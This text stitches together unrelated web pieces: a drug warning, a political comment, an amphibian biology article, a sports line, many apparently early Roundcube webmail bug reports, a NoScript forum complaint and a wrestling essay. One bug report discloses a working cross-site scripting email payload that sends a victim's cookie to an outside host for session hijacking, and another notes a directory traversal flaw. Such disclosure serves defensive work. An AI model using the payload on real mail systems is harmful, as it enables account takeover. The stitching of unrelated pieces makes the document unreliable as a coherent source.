AndroGel 1% is flammable until dry. Let the gel dry before smoking or going near an open flame.

The charges against David Cameron over his Iraq policy are well founded. But there are extenuating circumstances... It is time for a root-and-branch review of the principles of British foreign policy, so that they reflect two essential things: the world as it is and not as we would wish it to be; and the British national interest. Or, to put it another way, don't do nation-building and don't intervene in other people's civil wars - we usually make things worse, as in Iraq, and the waste of blood and treasure is unforgivable. If this means hobnobbing with dictators, so be it. Only genocide and threats to world order merit military intervention, as with IS.- Get inspired

What is an Amphibian?
Ectothermic vertebrates belonging to the class Amphibia are collectively known as Amphibians. The term “ectothermic” means the physiological heat sources of these animals are insufficient for maintaining the proper body temperature. Amphibians belong to the superclass Tetrapoda or tetrapod. Frogs, toads, salamanders, newts and caecilians are different animals in the Amphibia class.
The term Amphibian was derived from the Greek term “amphibious”, which means “both lives” or “two lives” (“amphi” meaning “both” and “bios” meaning “life”). This name refers to the fact that many Amphibians have two lives – the larval stage spent in water and the adult stage spent mainly on land.
Evolution of Amphibians
The first major Amphibian groups evolved from the lobe-finned fish approximately 370 mil years ago, during the Devonian period. The lobe-finned fish, resembling the modern lungfish and coelacanth, had undergone evolution to develop multi -jointed leg-like fins having small digits that helped them in crawling along the seabed. Some fish also developed lungs in order to survive in oxygen-deprived Devonian lakes and swamps while their strong fins helped them to get onto dry land if the water climate became hostile. Eventually, the strong bony fins of these creatures evolved into limbs, making them the ancestors to all tetrapod species.
Ichthyostega was among the earliest primitive Amphibians, having nostrils and comparatively efficient lungs. The animal had a distinct neck, four strong limbs and a tail covered with fins. Its skull bore great resemblance to that of Eusthenopteron, a type of lobe-finned fish.
The evolution of Amphibians continued as they developed a number of adaptive features to stay on dry land for longer periods of time. Their skeletons became stronger and they grew hands and feet having 5 or more digits while the respiratory system improved to allow them breathe out of water. The skin of the animals gradually became able to retain body fluids and they also developed ears that enabled them to hear on dry land.
The evolution also enabled them to locomote on dry land unlike their fish ancestors. Eventually the evolution completed and the modern day Amphibians came into existence.
Amphibian Scientific Classification
These animals belong to the kingdom Animalia, phylum Chordata and the superclass Tetrapoda. There are three subclasses in the Amphibia order:
- Labyrinthodontia
- Lepospondyli
- Lissamphibia
The first two subclasses are already extinct. The third subclass Lissamphibia is classified into four orders:
Anura
This order includes all the frog and toad species. The characteristic features of the animals in this order are the long hind legs that can be folded underneath the body, shorter forelegs, webbed toes without claws, glandular moist skin, large eyes and the absence of tails. Frogs are distinguished from the toads by their smooth skin as the latter have warty skin.
Anura is further classified into the suborders Archaeobatrachia, Mesobatrachia and Neobatrachia. Archaeobatrachia consists of the four primitive frog families Ascaphidae, Discoglossidae, Bombinatoridae and Leiopelmatidae. The Mesobatrachia suborder is more evolutionarily advanced and contains six families – the fossorial Pelobatidae, Megophryidae, Scaphiopodidae, Pelodytidae and Rhinophrynidae along with the obligatorily aquatic family Pipidae. Neobatrachia is the largest suborder among the three as it contains all the remaining modern frog families. Approximately 96% of the more than 5,000 existing frog species are neobatrachians.
Caudata
This order includes all the salamanders, Amphibians that resemble lizards in appearance. The resemblance is only a symplesiomorphic trait as the salamanders are not related to any lizard species. The main physical characteristic of the animals in this order are their scale-free skin ranging from smooth to tubercle covered, their long and laterally flattened tails and lack of claws. Many salamander species have finned tails.
This order is divided into three suborders with the first one, named Cryptobranchoidea, containing the primitive salamander species. At present, the only extant species from the Cryptobranchoidea suborder are the Chinese Giant Salamander, Japanese Giant Salamander and the Hellbender. The second suborder Salamandroidea consists of the advanced salamanders. The true salamanders belong to the Salamandridae family in this suborder while the members of the subfamily Pleurodelinae are commonly known as “newts”. The Plethodontidae contains the lung-less salamander species which includes around 60% of all salamanders. The third suborder of the order Caudata includes the four siren species which collectively belong to the Sirenidae family.
Gymnophiona
This order is also known as Apoda and is comprised of all the caecilian species. Caecilians are long, limbless and cylindrical Amphibians with a worm-like or snake-like appearance. Other distinctive features of these animals include the rudimentary eyes, transverse folds in their skin and the short tentacles located near their eyes.
Allocaudata
All the animals belonging to this last order of the Lissamphibia subclass are extinct.
Amphibian Anatomy
Skin
Their skin structure has certain characteristics typical among all terrestrial vertebrates. These include the extreme cornification of the outer layers of skin which is renewed sporadically through molting.
Their permeable skin allows for fluid and gas exchange into their bodies, making it possible for the adult animals to breathe underwater. The mucous glands located mainly on the backs, heads and tails of Amphibians secrete fluids to keep their delicate and thin skin adequately moist. Additionally, many species have granular poison-producing glands like the paratoids.
There are three pigment cell layers called chromatophores that are responsible for the skin coloration of these animals. The layers are comprised of melanophores, guanophores and lipophores. The characteristic color changing ability of some Amphibians comes from certain hormone secretion from pituitary gland. The vivid skin coloration of some species indicates their toxicity.
Skeletal System
Their skeletal system is homologous to various other tetrapods. Most of the animals have four limbs with the exception of the legless Amphibian caecilians as well as certain salamander species. The lightweight, hollow bones are fully ossified with the vertebrae being interlocked with one another in an overlapping manner. Both the head and body are supported by the strong musculoskeletal system. The sloping ilium holds their bodies closer to ground compared to mammals.
Circulatory System
The circulatory system for their juvenile and adult stages is different from each other. It resembles the circulatory system of a fish during the juvenile phase with a two-chambered heart for pumping blood through gills to be oxygenated. After reaching adulthood, their heart becomes divided into three chambers – 1 ventricle and 2 atriums.
Digestive System
Their digestive system consists of a pancreas along with a liver and gall bladder. The liver generally has two lobes with its size depending on its function as fat and glycogen storage unit. The adipose tissue located in the abdomen is an important energy storage site. This tissue can also be found under their skin and in the tail (in certain salamanders).
Excretory System
The two kidneys of Amphibians are located dorsally close to the roof of body cavity. The main function of the kidneys is filtering the blood of all metabolic waste and transporting the urine through the urinary bladder to be stored as urine before being excreted through cloacal vent. Nitrogen is excreted from the body as ammonia in dilute urine by the juveniles and many aquatic Amphibians. But the terrestrial species are known to pass the waste materials as urea which is comparatively less toxic.
Respiratory System
Their lungs are fairly primitive than those of amniotes, having few large alveoli and internal septa. Due to this reason, the lungs have a slow oxygen diffusion rate through the bloodstream. Buccal pumping is responsible for ventilation in these animals. The permeable property of the skin also helps with respiration. Some Amphibians, like the plethodontid salamanders breathe primarily through skin as they do not have lungs or gills. Various species carry out respiration through gills during the larval stage.
Nervous System
The basic anatomy of the nervous system is quite similar to that in other vertebrates. It comprises of a central brain, spinal cord and numerous nerves throughout their bodies. Their brains are not as developed as those of mammals, reptiles and birds. Rather, they bear similarities in function and morphology to the brains of fish. The brains are divided into three equal parts – cerebrum, mesencephalon (midbrain) and cerebellum.
Characteristics of Amphibians
Animals in the Amphibia class have many distinctive anatomical and behavioral characteristics that distinguish them from other Tetrapods:
- Unlike amniotes, the eggs of Amphibians lack the hard outer membrane. Due to this reason, they need water bodies to reproduce for keeping the eggs and larva comparatively safe.
- Amphibians are cold-blooded (ectothermic) vertebrates that cannot maintain body temperature through their internal physiological procedures.
- They have a low metabolic rate which leads to a limited requirement for food and energy.
- All the species have movable eyelids as well as tear ducts during the adult phase.
- Most species have distinct ears and good hearing, being able to detect airborne and ground vibrations.
- Many species can protrude their muscular tongues for hunting purposes.
- Modern Amphibians are characterized by their fully ossified vertebrae along with articular processes.
- Their three-chambered hearts are an important distinctive feature.
- Most of these species lay eggs in water with the larva being aquatic. They undergo metamorphosis in water and become terrestrial adults.
- The breathing mechanism of these animals is quite unique in which they draw the air through nostrils into their buccopharyngeal region. The nostrils are then shut so that the air can be forced into lungs through compression of the throat
- Another typical characteristic is their hinged pedicellate teeth.
Amphibians Habitat
They can adapt to a wide range of habitats with majority of the species living within arboreal, terrestrial, fossorial and freshwater aquatic ecosystems. The habitat of terrestrial Amphibians is limited to moist environments as their skin needs to be kept properly moist. They can be found in forests, grasslands, wet meadows, lakes and streams. Some species, such as Fejervarya raja can live in brackish water; although, no true marine Amphibian has been found.
Amphibian Reproduction
Various Amphibians living in the tropic regions do not have a specific breeding season and can breed throughout the year. But, in the temperate regions breeding mainly takes place during spring with the triggering factors being rising temperatures, increasing day length or rainfall.
Most of these species need fresh water for reproduction. But, some Amphibians can reproduce terrestrially as they have developed different means of keeping their eggs moist on land. There are many tropical frog species that are capable of breeding without standing water. The tadpole phase of these species is completed within the eggs that hatch into young frogs resembling the adults in appearance. Majority of the frogs inhabit the wet tropical rainforests.
Caecilians reproduce through internal fertilization which is likely to take place within the oviducts of the females. Frogs generally use external fertilization with a few species, like Ascaphus truei (Tailed Frog), engaging in internal fertilization. In most species, the female frogs lay the eggs in water while the males fertilize the eggs by releasing sperm onto them. Salamanders are known to exhibit internal fertilization. But some primitive salamanders from the Sirenidae, Cryptobranchidae and Hynobiidae families engage in a similar process of external fertilization generally used by frogs.
The eggs are usually bound together by certain transparent gelatinous secretion from the oviducts, containing mucopolysaccharides and mucoproteins. Sometimes, the eggs are laid in the form of string or are attached to underwater plants after they are laid individually. The eggs of terrestrial caecilians are laid in burrows close to water-bodies in the forms of grape-like clusters.
Amphibian Life Cycle and Metamorphosis
The hatchlings of most Amphibians go through metamorphosis once they come out of the eggs.
Typically, the offspring of these animals are aquatic with external gills and need standing water-bodies in order to metamorphose into adults. The process is controlled by the thyroxine hormone that triggers metamorphosis and prolactin that counteracts thyroxine's function. The juvenile animals often have various adaptive features for surviving, including fins, sensory lateral line resembling those in fish and horny ridges in place of teeth. These organs are re-absorbed through apoptosis (a process of controlled cell death) once the metamorphosis completes.
What Do Amphibians Eat?
The adults are usually carnivorous, feeding on small and slow-moving insects such as caterpillars, beetles, spiders and earthworms. The large Amphibian species are known to eat any insects and animals that fit into their mouths. Their diet may consist of small mammals, reptiles and fish. Some large species even feed on smaller Amphibians. Certain species may eat fruits and plant materials.
Newly hatched frog larva feed on the egg yolk as well as on detritus, algal crusts and some aquatic plant materials. Some carnivorous tadpoles even display cannibalistic behavior.
Amphibian Conservation
Amphibian populations all over the world have been facing dramatic decline in their numbers since late 1980s. Many species have become critically endangered or have even faced extinction. Their decline is considered to be a critical threat to the global biodiversity. According to studies carried out in 2006, around 4,035 Amphibian species existed that required water at some point in their lives. Approximately 1,356 out of the 4,035 species were included in the threatened category. However, this statistics is very likely to be underestimated. There are various threats to their existence, including habitat loss, pollution, ozone-layer destruction, climate change and introduction of new species.BOGART - With a 5-1 victory over Fannin County in the third round of the Region 8-AA softball tournament Thursday, North Oconee qualified for the Class AA state tournament for the seventh time in the school's seven-year history.

have an idea how dangerously it is to have config files
with a other extension than php.
Thanks an keep going on the good work!
If there is a space in a folder name, it does not
transform the space in the link to %20. Causes weird
multi-select bug if you select "Sent", it also selects
"Sent Items".
If I have three folders "FOO", "Foo" and "fooey" and I
select "FOO", it highlights all three.
The message list screen. When the subject contains a great deal of
text then the subject text overlays the from text.
If you login, then browse elsewhere for however long it
takes to expire... when you return, you will still see
your inbox.
Only have you perform an action eg. Read a message,
write a new one, will it tell you "Session has expired"

When reading a message I get the following warning
displayed behind the inbox.
Warning: Call-time pass-by-reference has been
deprecated - argument passed by value; If you would
like to pass it by reference, modify the declaration of
rcmail_str_replacement(). If you would like to enable

When you have a heirarchy of folders, there is no
provision for collapsing them... I have a very long list and
this is pretty important.
Great looking client.
When folder names are very long, they extend into the
main text area.
There are some alternative browsers (like Omniweb) which could
quite nicely handle Roundcube... if they could get to the interface.
Google's many AJAX apps provide a link that offers the ability to
continue even if the app does not recognise the ID string.
Might I suggest that if the web browser provides:
Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/
125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.50
... that Roundcube either default to providing the Gecko version,
or the KHTML/Webkit version if there are Safari-specific
modifications (assuming the user chooses to continue).

First of all, I want to thank you for this great software.
For a first realease RoundCube is impressing me.
It was nearly perfect for me, clean, reactive and well
looking interface,
However there is two bugs, which frustate me, and then
stop me to remove completly horde/imp :)
The first one :
My company and I use Courier imap server, wich store
all the
folders in the INBOX folder (separate byt a dot).
So when I left blank the $rcmail_config['imap_root'] = '';
I see my folder like these :
Inbox
INBOX.Sent
INBOX.Thrash
INBOX.Whatever.
In horde/imp I configure my 'imap_root'='INBOX.'.
But with this setting I cannot see any folders...
I try many other setting with no success.
So is there a trick here or is there a bug ?
Notice : I quickly hack the code, to remove the
'INBOX.' at the beginning at the display in the
program/steps/mail/func.inc and in the
manage_folders.inc files ; but this is ugly and dirty.
Second bug :
I the display of non-mime, plain text email, the last
character always disappear.
This is really a problem, ok in general it is the
signature; but sometime it break something important,
like the last character of an URL for example.
Thanks in advance.

When a message is deleted from the Trash folder the
updated unread message count for the Trash folder is
displayed as the unread message count for the Inbox folder.
Have this imap login: jakob@grimstveit.no (yes, I have
to use domain also). When sending to my ISPs smtp
server (smartmail.hjemme.no), it says
SMTP Error in
/files1/www/docs/grimstveit.no/webmail/program/steps/mail/sendmail.inc
(179): Connection failed: 553 5.1.3 ... Invalid route
address
Using latest snapshot.
It would be nice to be able to view a list of just all
the new email in any folder.
This seems specific to Firefox 1.0.6 on Linux (my
distribution is Ubuntu Breezy Colony 3 (with current
updates)).
The same action works fine with IE 6 and Firefox 1.0.6
on Windows XP.
Steps to Reproduce:
1. Login
2. Double-click on the subject line of a message in the
Inbox.
Expected Behavior:
Message will be displayed.
Actual Behavior:
The message never appears, and all items on the page
become non-functional. Refreshing the page or clicking
back then forward "fixes" the hang, at least until one
tries to view a message again.
RoundCube Webmail guessed wrong at my email address,
which meant any emails I sent out before visiting the
identities dialog would have the wrong return address
on them.
When a user first logs in, they should have the
opportunity to configure the default identity.
I've got a folder with about 2000 messages and
Roundcube crashes when I click it.
This means: In Internet Explorer Roundcube shows an
empty folder and Firefox loads the page forever.
Using a login name such as john@doe.net (everyone who
is required to use their email as their IMAP login),
logging into the IMAP server mail.doe.net causes
RoundCube to initially configure the email address as
john@doe.net@mail.doe.net which causes problems when
sending mail.
This is quickly remedied through the identity setting,
but can be confusing to a new user.
The mailcontframe content (Message List) does not check
for new messages. It is expecially annoying when you
must click on a separate folder and back to the inbox
to see if you have new messages.
Thanks,

Trying to open a message with a 4MB zip file, and it
never opens (Waited 10 minutes). Many of the screen
elements lock, can't click on "compose" afterwards.
Must click and open another message before gettign
control back again.
On a seconary note, a warning that the message you are
trying to open is large and may take a little time
might be good.

Roundcube is pretty impressive in Beta and it looks great!
You appear to be Mac users, so I'm sure you're familiar with Address
Books new feature that enables you to publish your address book to
your .Mac account, just like you can publish a calendar with
Calendar. Others can subscribe to the calendar and it will appear in
their Address Book.
Since I keep all of my contacts in Address Book (a lengthy list), it
would be great to be able to have Roundcube subscribe to my
published Address Book so I can have the benefit of Roundcube's
slick interface and all of my contacts from Address Book.
I know this will appeal to a limited number of users, but I imagine
that mac fans would love it.

I'm translating roundcube to Spanish and Catalan
languages, and I've found two little problems doing so:
1. You have to edit "program/steps/settings/func.inc"
file in order to let users choice new languages. This
should be either automagically guessed (through listing
localization directory and adding a little setup.inc
with language name for each translation) or modifying
the global config file, but not having to edit
program's code ;)
2. There's a strange behavour when handling special
characters. Through trial-and-error I've seen that some
strings must be in "iso-8859-1" charset and others in
"utf-8". Yes, mixed on the same file :S Example follows
with config file as 8-bit encoded (iso-8859-1)
- Original string: Add to address book
- Spanish translation: Añade el contacto a la libreta
de direcciones
- Original string: Password
- Spanish translation: ContraseÃ±a
And the two strings are correctly displayed. If you try
to write "Contraseña" then it isn't shown correctly
displayed in roundcube.
Hope that you've been able to understand me hehe....
In the mail folder view, the ability to sort by columns
(sender, date, subject, etc) would be a very useful
feature...
Tooltip for the Forward icon in the mail viewing page
is 'Forwad', should be 'Forward'. :o)
When an URL over the line-wrapping length is included
in an email body (an example would be
'')
RoundCube wraps the line after the final '/' character,
and does not include the post-wrap text in the hyperlink.
I would suggest that the Right Thing to do would be
either to not wrap the text, or to wrap as normal but
preserve the hyperlink for the entire text.
On the message list page, the scrollbar for the message
list scrolls the entire table, including the column
headers.
Suggest that the correct behaviour would be to leave
the column headers and scroll the message rows themselves?
On the message list page, the scrollbar for the message
list scrolls the message list up and down, leaving the
rest of the page intact. On the view mail page, the
scrollbar for the page (which is the default
entire-page scrollbar) scrolls everything up and down,
leaving only the bottom nav buttons unmoved.
I suggest that the message list behaviour is the right
one to use for the mail view - have a scrollbar for the
message body, leave the rest of the page fixed.
Adds the scroll and nowrap style so that long folder
names don't overflow or wrap over other text.
I am very interested in trying roundcube and using
it in several places, but much prefer postgres as a
database. Are there plans to support postgres
alongside mysql?
clicking unread (unseen) messages causes roundcube to
load the page endlessly without displaying the message.
No error message is produced.
I have to click stop loading and reload the page
afterwards.
It only happens to unread messages.
Tired it first with firefox 1.0.6 on gentoo linux and
could reproduce the problem with IE 6 on WinXP. I also
tried a different user account and got the same result.
(Apache 2, PHP4, Debian Sarge)
Roundcube cannot send mail on my system thought SMTP.
For some reason it throws a fit over the from field.
I can fix it by opening the sendmail.inc file and
finding where $from is sent to the smtp server.
Apparently $from is blank. I haven't isolated the
problem, but I'll let you know if I figure anything
out. I just thought I'd post the problem on here.
In the file IMAP.INC on line 843, there is a call to a
function which is written as follows:
$num = iil_C_CountMessages(&$conn, $mailbox);
This produces
--
If you remove the & from the call to the function this
message goes away, so you replace the above line with:
$num = iil_C_CountMessages($conn, $mailbox);
This stops the messages from coming up, and does not
break the code. This will make the code compatible with
PHP5
Hope this helps
Colin
What would be nice is the ability to change your email
C
This patch will remove
----
This is only my fix and is not something which is
offical from RoundCube. Use this if you wish to install
this on a PHP5 server and you don't have access to
change the server settings.
Hope this helps

At the moment none of the non-English e-mails can be
viewed here. My mails are mostly double byte (Chinese,
Japanese and Korean), but I suppose all non-iso8859-1
mails won't work.
Most modern e-mails come with an MIME header. HTML
The application should use unicode (e.g. UTF-8) in all
places and ask php to translate the whole e-mail body
into UTF-8 from its original encoding.
Don't see any option to "Reply to All".
Add a configurable e-mail address where users can send
spam reports with a single click.
Hello, I've just installed "RoundCube Webmail".
Everything works, I can send / receive email. But, when
I select messages and I press "Delete" the are
cancelled from the message's list, but they are not
moved to the Trash !
If I click again on the Inbox folder I see all the
message again !
The point is that if I select the message and the I
drag them to the trash they are cancelled !
Any ideas ?

When specifying multiple servers, it'd be nice to be
able to give a friendly name for the server that is
show instead of the servername at the login page.
Most source code files in 0.1-20050820 have this
license boiler plate:
This contradicts the claim (in the Webpage and in the
sf.net summary) that RoundCube is licensed under GPL terms.
Please update the license boiler plates in the source
code files. Also, it would be fine to mention the
license conditions of the source in a README file
(including the third party sources).
The clock is off by 1 hour because there is no option to
adjust for daylight savings correction.
Hi,
The web interface is missing some sort of refresh
button, or a autorefresh feature.
Hi,
The INBOX unread count shows negative values if I click
on an unread item and mark it as read.
This happens if for example you have a SPAM cleaning
agent, that cleans emails at the background, one
instance of RoundCube finds new emails, and counts
them, while the folder list doesn't, making the
counting return two different values... Looks like a
race condition between the two counting processes.
Create a tree style view of the folder list instead of
a long list..
The following code, which isn't optimal, will generate
an arrayed hash of the folder structure... limitations
... only up to 4 levels deep are supported, the use of
"ROOT" as a base item isn't necessary...
Also I didn't know how to convert the below folder
structure into the viewable GUI... please proceed...
this is one of the features most (in my opinion)
missing from RoundCube.
$foldernames = array();
foreach ($a_folders as $i => $folder)
{
$currentsubfolder = $folder;
$item = array();
while (preg_match('/^([^\.]+)\.(.*)/',
$currentsubfolder, $matches))
{ // Current folder is a child...
array_push($item, $matches[1]);
$currentsubfolder = $matches[2];
}
if ($currentsubfolder != "")
{
array_push($item, $currentsubfolder);
}
if (count($item) == 0)
{
$item = array("$folder");
}
if (array_key_exists($item[0], $foldernames))
{ // Parent folder already inside array
if (count($item) == 2)
{
$foldernames["$item[0]"]["$item[1]"] =
array("ROOT" => "N/A");
}
if (count($item) == 3)
{
$foldernames["$item[0]"]["$item[1]"]["$item[2]"] =
array("ROOT" => "N/A");
}
if (count($item) == 4)
{
$foldernames["$item[0]"]["$item[1]"]["$item[2]"]["$item[3]"]
= array("ROOT" => "N/A");
}
}
else
{
if (count($item) == 1)
{
$foldernames["$item[0]"] = array("ROOT" => "N/A");
}
else
{
$foldernames["$item[0]"] = array("ROOT" => $item[1]);
}
}
}
print "<PRE>";
print_r($foldernames);
print "</PRE>";
Hi,
The parameter _task is vulnerable to a directory
traversal vulnerability, for example:
Would return the watermark HTML file, u need to be
logged on to access the files.
By sending an email (HTML) that contains something of
the sorts of:
<HTML>
<BODY>
<we onmouseover='document.write("<bo" + "dy><ht" +
"ml>" + document.cookie + " stolen<br><img src=ht" +
"tp://192.168.4.52/~noam/?" + document.cookie +
"><\\/img><\\/html><\\/body>");'>click</we>
</BODY>
</HTML>
I can cause a user hovering over the click text to
unwillingly send me his cookie, which in turn I can hijack.
I could of course load any external JS I would wish as
well, and preform other feats such as send emails to
his contacts, etc.
I got a perl script that generates this email, but I
think the above example is clear enough.
The IMAP server name should be independed from the
domain name of that server.
i.e. my IMAP server is called imap.example.com, while
my domain is example.com, the current configuration
doesn't appear to support anything but defining
imap.example.com (in which case the emails will be
marked as being sent from imap.example.com causing a
problem).
As a workaround I can modify /etc/hosts of the webmail
server, and add an entry where example.com resolves to
127.0.0.1, or similar.
Add an additional option of getting user information directly from the LDAP
directory (for example on Mac OS X Server's OD), Add in a hook to use
the LDAP schema, instead of creating a mySQL schema for the contact
information.
There needs to be an option to set the trash folder. My
IMAP server creates the trash folder at inbox/trash
instead of just trash. Roundcube will not delete
messages because of this.
I can not currently access my imap service provider as
they only provide imaps. I know that you can rip the
code out of ilohamail as the development version
supports imaps perfectly.
Just add a checkbox next to the login somewhere that
says secure connection.
Awesome piece of software!!! Keep it up!
Add the ability to purge all messages from the trash
and junk folders with a single click. If there are a
large number of messages choosing select all and delete
multiple times can be time consuming.
when i sent a message diplay:
Warning: fopen(./logs/sendmail): failed to open stream:
Keine Berechtigung in
/home/enko/domains/enko.com.mx/public_html/mail/program/steps/mail/sendmail.inc
on line 236
what can i do???
In the preferences the link on the tab is only as big
as the text. eg. Folders or Preferences. They should
be as big as the visible tab. Patch attached for the
default skin.
I have all the settings the same as before I upgraded,
I even deleted everything and started over new, but
everytime I log in, it says it cannot connect to the
IMAP server, while the last one did fine with the same
settings, and I can connect via webmail or outlook. The
port is also correct. My mail address is
mail.domain.com and my IMAP server is also
mail.domain.com, but that was not a problem last time,
and shouldn't be because they are different ports. So I
keep getting this:
IMAP Error in (): Could not connect to mail.domain.com
at port 143
With our setup using Direct Admin Control panel I can
go to the folder view and see every virtual users
folders (say i have admin@domain.com and
test@domain.com) I can subscribe to those folders and
read their mail.
Not sure if this is a imap config problem or a problem
with roundcube (Ilohamail doesn't show them).
Thanks
just seen pgsql suport and decided to test, however
looks like no one use it:
- 'ip' column missing in 'session' table
- postgres do not support LIMIT #,# syntax, use LIMIT
and OFFSET clauses
- there's no NOW() function, use now() instead
- change ORDER BY `default` to ORDER BY "default"
And sort of feature request:
- add prefix to table names. it's useful to have
"rc_sessions" table instead of "sessions" when you've
limited number of databases.
- add dynamically configurable sequence names
In file 'program/steps/mail/sendmail.inc' in the line
$sent = mail($mailto, $msg_subject, $msg_body,
$header_str, "-f$from");
$mailto and $msg_subject should be Qencoded
The file 'program/include/rcube_smtp.inc' uses a short
open tag. It would be better to use <?php I think.
When replying to a message that already contains 'Re:'
in its subject, a new Re: will be added. This results
in a subject like "Re: Re: Re: Our conversation". Check
for Re: before adding one.
I'd like to see an option to abbreviate the login. For
example, if the required mail login is "bob@…"
it would be nice to allow a login of simply "bob", with
the "@server.com" assumed if not specified.
when composing a new message, clicking on send without
putting some text in the to, subject and message body
fields does nothing.
should probably warn the user that they need to enter
values in the fields.
maybe thunderbird like behaviour if the subject is
empty? warn but allow to send anyway?
i'll have a look and see if i can figure out a patch.
It'd be nice if the outgoing mails could be saved to a
folder as well, so all mail about <topic> winds up in
the same folder.
Incoming mail: I move it there when I've read it.
Outgoing mail: I select the folder during compose and
it gets saved there instead of to the Sent Mail folder.
Interface: just a dropdown menu with the Inbox
subfolders, with a (customizable) default setting:
"Save Sent Message in: [ Sent Mail [v]]"
When sending mail (incl replying or forwarding), prompt
the user to save any address in the to/cc/bcc fields
that aren't already in the address book. A simple
message in the pop-up 'information' box (eg the one
that usually says "Sent OK") saying "Click here to add
these addresses" would be sufficient, followed by a
screen listing each of the unknown e-mail addresses,
requesting a name for each.
If you enter a new folder name and press enter (instead
of pressing the Create button) the page refreshes and
no folder is created.
This sounds like it will be a great project. Is there
any possibility of roundcube supporting the Firebird
database? I've noticed that you already support MySQL
and Postgre.
If you have any questions regarding FB I'd be willing
to try and answer them for you.
I would love to see this product support the POP3
Protocol.
"This new release comes up with support for SQLite and
PostgreSQL" ... if true, you should update the summary.
I might have missed roundcube, otherwise. Thanks.
(There may be other ommissions there, too.)
Not sure if this is intended behavior or not, but when
you create a folder (in Firefox), the folder name you
added is left in the text box. I expected that the
text box would be emptied.
I'd like to see roundcube translated to pt-BR as well
I have followed the install instructions to a T.

I'm writing a mail and attach file, if i want to remove

This is a VERY quickie patch to get pgsql support
actually working with the latest roundcube release.
This is not the right way to do this. Let me say that
again: this is not the right way to do this. This is
just a quick hack to get things working so you can get
to a login screen.
When one of my (non-INBOX) folders has unread messages,
and I delete them all, the folder still shows the same
unread count in the left folder pane.
When selecting messages in the mailbox index view,
pressing SHIFT currently allows selecting multiple
individual messages. The expected behavior is to
select a range of messages between the two selected.
The current behavior should be changed to use the CTRL key.
At least that's the expected behavior in Gnome and
Windows... someone correct me if Mac is different.
It would be wonderfully useful for large environments
if RoundCube could support the following:
1) Authentication via LDAP
2) Retrieve user's designated IMAP server address from
the directory and connect to it
3) Use directory as global address book
4) Read / write user's personal address book in LDAP
5) Change user's LDAP password
3 & 4 probably require the ability to create multiple
address books for an account.
I have a large number of folders in my account. Rather
than expand to accommodated them, the folder list pane
truncates it with no way to access the lower folders.

Add keyboard shortcuts to the client. Specifically:
Add some way to read / preview a message from the index
when you highlight it, without having to double-click it.
When I switch folders, the Reply / Forward / 
buttons are automatically enabled, even though no
message is highlighted.
Allow folders in the folder pane to be collapsible.
Large numbers of subfolders are awkward to have
displayed in one big list.
Add custom context menus when right-clicking on
messages or folders in the index view.
For the View Source popup window, don't display browser
toolbars etc in the popup window.
The bottom toolbar is somewhat confusing. For one, it
took me awhile to even see it at the bottom there and
figure out what it did. But the icons are also a bit
vague. In particular, the logout icon looks like it
might be a delete icon, so in a message view a user is
likely to click it to delete the message and oops!
they're logged out.
Suggestions:
1) Add descriptive text by the buttons
2) Move the toolbar to a more intuitive place. Maybe
you could move them just about the folder list, solving
both problems.
When creating a folder, allow the user just to specify
a folder name, and then choose a parent folder from a
list, rather than requiring they type the full folder
path in (which could be error-prone).
Add "Reply All" button in message index and message
detail views.
Add ability to rename IMAP folders in Options / Folders.
Allow the user to create a signature for each identity
that is appended to all outgoing messages. Where the
signature is placed for replies could be a customizable
option.
Allow plugins to be easily created. For instance, I
would be interested in building plugins to manage
server-side filters and vacation messages (via FTP),
but those are probably implementation specific enough
that they should not be part of the core..
When a user clicks a link in an HTML email, it should
open a new window by default.
Support for Gmail would be nice, since Gmail is blocked
on some networks. :)
When printing an email directly from the mailbox
listing the message is not shown as read in the listing.
After reloading it is shown as read.
When choosing the Dutch translation, three characters
of garbage are displayed on the top of the page.
Roundcube desperately needs server-side sort. I can't list large
mailboxes because the browser times out while Roundcube is
reading the message list. It should be able to read only the first X
messages by whatever criteria, and display them. That would take it
from being interesting to usable for me.
Hey guys,
This might be a bug :
Warning : rmdir(temp/2031184212434fbb2ee5058):
Directory not empty in program/steps/mail/func.inc on
line 1242
What I did was :
1) create a new message
2) attach a file
3) return to inbox without sending/saving message
.. and I got this error message.
Could be fixed by prompting user to save message and/or
check if directory is nonempty before deleting ...
nice work and impressive results anyway
be well
tbz

The problem with noscript is that once you allow a domain, it's allowed regardless of which site you allowed it on. This is a huge problem, since I might trust domain x to use jQuery's CDN, but not site y. If I allow jQuery CDN it's allowed for both. Try blocking google-analytics for instance, and see how many sites break - for no other reason than that they want analytics to run, and their scripts check for this (or depend on it in some retarded way, I'm not sure). That means in order to use a handful of sites that have retarded dependencies, I have to allow this idiocy for every site i visit.
The other problem with the granularity is that most professional sites pull in javascript from multiple domains, so it turns into a treasure hunt trying to find the handful of domains you need to unblock before the site works. And it's even more fun when the site has hidden dependencies, that only pop up after you allow a domain on the list - making the already long list expand dynamically. And of course there's no way to see the script you're allowing unless you want to sift through the entire source of the page.
This is why noscript remains a nerd tool, the menu has a function that allows all scripts on a given site, a ripe choice of you already have the "click through" mentality. What a user sees is "lots of choices, this one makes the problem go away" and once that is learned the whole point of noscript goes the way of Windows UAC - yes, yes, yes, oh shut up.
TL;DR: noscript is good advice, although it requires far more user maintenance than resonable.

I imagine silhouetted “creative members” in a room where only the table is lit with an intense, swinging overhead lamp, discussing storylines over cheap cigarettes. Though with members like Michael Hayes, I’m sure the process is a lot more comical than I can imagine. However, in much of our understanding of producing a show, segment or even a single moment in a match, we often neglect one important factor: us.
“Agency” is a term in various fields of entertainment and academia used to describe a lot of different things. While it’s often used in a theoretical context, such as Descartes’ position that the agency of one’s consciousness is separate and master to the body and bodily entities (a position challenged by David Cronenberg’s The Fly), other fields use “agency” in a more functional sense, specifically in describing an audience member’s agency with regards to the subject to which he is audience.
Before I apply this to wrestling, let me first give two not-too-dissimilar examples to give the parameters for comparison. First of all, let’s talk about video games. Now more than ever, video games react dynamically to the input of the gamer. Rather than, in games such as Fable, allowing you to choose Choice A and Choice B resulting in scripted Result A or Result B, your decision (which needn’t be so black-and-white as “good” or “bad) can have a myriad of results as determined by the “laws of physics” encoded in the game’s design. Far Cry 3 is a perfect example, as organic instances can often occur independent of the gamer’s input (such as a Bengal Tiger meandering into town and slaughtering the mercenaries) and the gamer’s effects on the in-game world can affect the fiction relative to the particular actions. Of course, gamers can’t make wholly independent impacts on the game since they still are subjected to the game’s particular codes, but then again, neither can a person in the real world act wholly independent since we are also subjected by the real Laws of Physics.
